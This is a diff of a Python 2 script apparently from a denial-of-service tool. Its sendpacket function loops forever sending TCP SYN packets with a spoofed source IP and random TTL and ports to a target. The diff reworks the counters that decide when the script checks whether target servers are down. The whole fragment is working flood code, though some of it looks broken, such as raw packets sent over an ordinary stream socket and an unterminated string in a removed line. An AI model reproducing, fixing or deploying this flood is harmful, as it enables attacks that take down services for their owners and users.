@@ -7,22 +7,27 @@ def sendpacket(Ip_range, destinationnew, targetport, destination):
     import socket
     silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     silva.connect((destinationnew, targetport))
-    number = 1
     cnt = 1
+    cntchecksum = 1
+    cntcheck = 1
     if type(Ip_range) != list:
         while 0 == 0:
              try:
                  silva.send(bytes(IP(dst = str(destinationnew), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
-                 print str(cnt) + ' packages sent!; 
-                 if cnt == 1:
-                    cntcheck = random.randint(1000, 2000)
+                 print str(cnt) + ' packages sent!' 
+                 if cntcheck == 1:
+                    cntcheck = random.randint(8000, 10000)
                     cnt = cnt + 1
+                    cntchecksum = cntchecksum + 1
+                   
                  else:
-                    if cnt == cntcheck:
+                    if cntchecksum == cntcheck:
                        if 'h' in destination:
                            checkserversdown(destination)
-                           cnt = 1
-                      
+                           cntcheck = 1
+                    else:
+                       cnt = cnt + 1
+                       cntchecksum = cntchecksum + 1
              
                  
              except:
